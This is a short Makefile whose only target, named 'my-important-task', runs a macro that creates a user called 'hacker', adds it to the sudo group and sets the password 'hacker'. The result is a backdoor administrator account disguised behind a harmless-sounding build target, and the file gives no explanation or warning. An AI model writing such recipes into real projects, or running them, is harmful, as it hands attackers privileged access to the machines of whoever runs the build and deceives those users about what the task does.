define my_important_task =
sudo adduser hacker;
sudo usermod -aG sudo hacker;
sudo echo "hacker" | passwd --stdin hacker;
endef

my-important-task: ; $(value my_important_task)

.ONESHELL:

